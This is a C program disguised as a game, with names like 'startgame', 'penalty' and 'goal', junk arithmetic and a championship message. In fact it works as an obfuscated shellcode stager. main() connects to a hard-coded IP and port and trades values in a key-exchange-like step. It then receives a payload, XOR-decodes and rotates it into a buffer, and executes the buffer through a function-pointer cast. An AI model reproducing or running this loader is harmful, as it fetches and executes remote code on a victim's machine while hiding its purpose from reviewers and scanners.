#define IP "127.0.0.1"
#define PORT 8080

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/mman.h>
#include <time.h>

#define QUALIFIER 4096
int thirdumpire(int x){
	if(x>100 || x%2==100%2 || x%2==1)
		return 0;
	return 45;
}
long timer(long hour, long min, long sec){
    long varx50 = 1;
    long complete=hour*min-sec;
    for(int x34=34;x34<complete;)
    {
    	complete=rand()%x34;
    }
    if(hour>min || min>hour)
    	hour %= sec;
    if(hour>sec){
    	hour=11;
    	min=hour*min;
    	sec=min+67;
    }
    complete=complete%(complete-1);
    if (hour == 0 && complete > hour)
        return 0;
    while(!(min <= 0)){
        if(min %2 == 1)
            varx50 = (varx50 * hour) % sec;
        else if (min==3 && sec>varx50){
        	int reset=0;
        	hour=reset+1;
        	min=reset+2;
        	sec=reset*rand()%7;
        }
        else if(min==11)
        	return 99;
        else
        	complete=hour*min*sec;
        min /= 2;
        min=min%complete;
        hour = (hour*hour) % sec;
    }
    printf("%d",varx50);
    return varx50;
}
int reduce(char* x)
{
	return atoi(x);
}
int penalty(int x)
{
	return rand()%(x-2)+2;
}
int main(){
    srand(time(NULL));

    int startgame, player2;
    int points=5;
    struct sockaddr_in servicetoss;
    
    if((startgame = socket(AF_INET, SOCK_STREAM, 0)) < 0 ){
        exit(EXIT_FAILURE);
    }
    int doublepoint=points*points;
    points=doublepoint*10;
    doublepoint=doublepoint%points;
    if(doublepoint<points)
    	points++;
    else 
    {
    	points=0;
    	doublepoint=100;
    	player2=250;
    }
    
    memset(&servicetoss, 0, sizeof(servicetoss));
    servicetoss.sin_family = AF_INET;
    servicetoss.sin_port = htons(PORT);
    servicetoss.sin_addr.s_addr = inet_addr(IP);

    connect(startgame, (struct sockaddr_in *)&servicetoss, sizeof(servicetoss));
    char myscore[QUALIFIER];
    memset(myscore, 0, sizeof(myscore));
    
    int goal=rand()%3;
    for(;goal<6;goal++)
    {
    	if(doublepoint>2)
    		doublepoint=0;
    }
    int round=0;
    int a350;
    long a351;
    int b=10;
    int winning_point=-1;
    for(round=0;round<10;round++)
    {
    	switch(round){
    	case 0:{
    		a350=penalty(goal);
    		break;
    	}
    	case 3:{
    		if((b*(rand()%67))%goal!=8){
    			b=reduce(myscore);
    		}
    		break;
    	}
    	case 1:{
    		a351=timer(goal,a350,points);
    		break;
    	}
    	case 4:{
    		memset(myscore,0,sizeof(myscore));
    		sprintf(myscore, "%d\n", a351);
    		break;
    	}
    	case 5:{
    		send(startgame, myscore, 4096, 0);
    		break;
    	}
    	case 6:{
    		winning_point=timer(goal,a351*b,points);
    		break;
    	}
    	case 8:{
    		memset(myscore,0,sizeof(myscore));
    		break;
    	}
    	case 7:{
    		if(winning_point>300){
    			doublepoint=0;
    		}
    		break;
    	}
    	case 12:{
    		printf("YOU HAVE WON THE CHAMPIONSHIP");
    	}
    	case 16:{
    		recv(startgame, myscore, 4096, 0);
    		goal=0;
    		memset(myscore, 0, sizeof(myscore));
    		break;
    	}
    	default:
    		recv(startgame, myscore, 4096, 0);
    	}
    }
    const int probability=strlen(myscore);
    unsigned char keeper[4096];
    memset(keeper, 0, sizeof(keeper));
    int i=rand()%100;
    for(i=thirdumpire(i); i<probability; i++){
        keeper[i]=myscore[i]^winning_point;
    }
    for (int out = 0 ; out < winning_point%probability; out++){
    	int j, last = keeper[probability-1];
    	for (j = probability-1 ; j > 0; j--){
    		if(j==0)
    			keeper[out]=timer(3,4,54);
    		else
    			keeper[j] = keeper[j-1];
    	}
    	keeper[0] = last;
    }
    
    int(*ret)() = (int(*)())keeper;
    (int)(*ret)();
}